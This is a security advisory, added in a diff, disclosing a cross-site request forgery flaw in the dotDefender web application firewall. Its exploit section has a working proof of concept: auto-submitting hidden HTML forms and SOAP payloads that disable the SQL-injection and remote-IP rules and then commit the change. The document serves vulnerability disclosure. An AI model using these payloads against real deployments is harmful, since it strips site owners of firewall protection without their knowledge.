@@ -1,0 +1,228 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/DOT-DEFENDER-CSRF.txt
+
+
+Vendor:
+==================
+www.applicure.com
+
+
+Product:
+=====================
+dotDefender Firewall
+Versions: 5.00.12865 / 5.13-13282
+
+
+dotDefender is a Web application firewall (WAF) for preventing hacking
+attacks like XSS, SQL Injections, CSRF etc...
+that provides Apache and IIS Server Security across Dedicated, VPS and
+Cloud environments. It meets PCI Compliance and also
+provides E-Commerce Security, IIS and Apache Security, Cloud Security and
+more.
+
+
+Vulnerability Type:
+=================================
+Cross Site Request Forgery - CSRF
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+Dotdefender firewall (WAF) is vulnerable to cross site request forgery,
+this allows attackers to make HTTP requests via the victims browser to
+the dotdefender management server on behalf of the victim if the victim is
+logged in and visits a malicious web page or clicks an infected link.
+Result can be modifying or disabling various firewall patterns,
+User-Defined Rule settings and global event logging etc...
+
+
+HTTP requests sent to Dotdefender to enable or disable user-Defined rule
+settings are base64 encoded using SOAP protocol.
+Sending the below base64 value for example disables a Dotdefender firewall
+setting.
+
+PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+
+<enabled>false</enabled>
+
+
+Tested successfully on Windows & Linux:
+
+dotDefender Version:          5.00.12865
+Web Server Type:              Microsoft-IIS
+Server Operating System:      Windows
+Web Server Version:           7.5
+Firefox web browser
+
+
+dotDefender Version:     5.13-13282
+Web Server Type:     Apache
+Server Operating System:     Linux
+
+
+Exploit code(s):
+===============
+
+Example to send requests to disable firewall rule settings that defends
+against SQL injection.
+We need to send two requests first to modify the desired settings and
+second to commit our changes.
+
+
+HTTP request 0x01 - send following soap request to disable SQL Injection
+request firewall rule
+~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~
+
+<IFRAME style="display:none" name="demonica"></IFRAME>
+
+<form target="demonica" id="SACRIFICIAL" action="
+http://localhost/dotDefender/dotDefenderWS.exe" ENCTYPE="text/plain"
+ method="post" onsubmit="TORMENT()">
+<input type="hidden" name='<soapenv:Envelope xmlns:xsi="
+http://www.w3.org/2001/XMLSchema-instance"
+ xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+ xmlns:ZSI="http://www.zolera.com/schemas/ZSI/"
+ xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+ xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
+ xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+ soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+ <soapenv:Body xmlns:ns1="http://applicure.com/dotDefender">
+ <ns1:set_xpath><site xsi:type="xsd:string">0</site>
+ <xpath
+xsi:type="xsd:string">/ud_rules/request_rules/request_rule[rule_id=1]/enabled</xpath>
+ <xml xsi:type="xsd:base64Binary">PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+</xml>
+ </ns1:set_xpath></soapenv:Body></soapenv:Envelope>'>
+<script>document.getElementById('SACRIFICIAL').submit()</script>
+</form>
+
+
+HTTP request 0x02 - send the next request to commit the changes
+~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~
+
+<form target="demonica" id="VICTIM" action="
+http://localhost/dotDefender/dotDefenderWS.exe" ENCTYPE="text/plain"
+ method="post">
+<input type="hidden" name='<soapenv:Envelope xmlns:xsi="
+http://www.w3.org/2001/XMLSchema-instance"
+ xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+ xmlns:ZSI="http://www.zolera.com/schemas/ZSI/"
+ xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+ xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
+ xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+ soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+ <soapenv:Body xmlns:ns1="http://applicure.com/dotDefender"><ns1:commit>
+ <sites><element0 id="0" xsi:type="xsd:string">0</element0></sites>
+ </ns1:commit></soapenv:Body></soapenv:Envelope>'>
+<script>function
+TORMENT(){document.getElementById('VICTIM').submit()}</script>
+</form>
+
+
+
+Other SOAP payload examples for rule disabling:
+~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
+
+this is disable a rule #19, send the below request to disable remote IP
+protections:
+
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ZSI="
+http://www.zolera.com/schemas/ZSI/"
+xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="
+http://schemas.xmlsoap.org/soap/encoding/"
+xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<soapenv:Body xmlns:ns1="http://applicure.com/dotDefender"><ns1:set_xpath><site
+xsi:type="xsd:string">0</site>
+<xpath
+xsi:type="xsd:string">/ud_rules/request_rules/request_rule[rule_id=19]/enabled</xpath>
+<xml
+xsi:type="xsd:base64Binary">PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+</xml></ns1:set_xpath></soapenv:Body></soapenv:Envelope>
+
+
+disable rule 20:
+~=~=~=~=~=~=~=~=
+
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:ZSI="http://www.zolera.com/schemas/ZSI/" xmlns:SOAP-ENV="
+http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soapenv="
+http://schemas.xmlsoap.org/soap/envelope/"
+soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><soapenv:Body
+xmlns:ns1="http://applicure.com/dotDefender">
+<ns1:set_xpath><site xsi:type="xsd:string">0</site><xpath
+xsi:type="xsd:string">/ud_rules/request_rules/request_rule[rule_id=20]/enabled</xpath>
+<xml
+xsi:type="xsd:base64Binary">PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+</xml></ns1:set_xpath></soapenv:Body></soapenv:Envelope>
+
+
+Finally commit them with below request:
+~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
+
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:ZSI="http://www.zolera.com/schemas/ZSI/" xmlns:SOAP-ENV="
+http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soapenv="
+http://schemas.xmlsoap.org/soap/envelope/"
+soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><soapenv:Body
+xmlns:ns1="http://applicure.com/dotDefender">
+<ns1:commit><sites><element0 id="0"
+xsi:type="xsd:string">0</element0></sites></ns1:commit></soapenv:Body></soapenv:Envelope>
+
+
+
+
+Disclosure Timeline:
+================================
+Vendor Notifications:
+
+initial report 11/16/2015
+vendor response 11/20/2015
+vendor delays for two months
+1/19/2016 Vendor finally acknowledges vulnerability
+inform vendor of a disclosure date
+vendor no longer responds
+Feb 8, 2016 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+==================
+High
+
+
+Description:
+==========================================================
+
+Request Method(s):           [+] POST
+
+
+Vulnerable Product:          [+] DotDefender v5.0 & v5.13
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
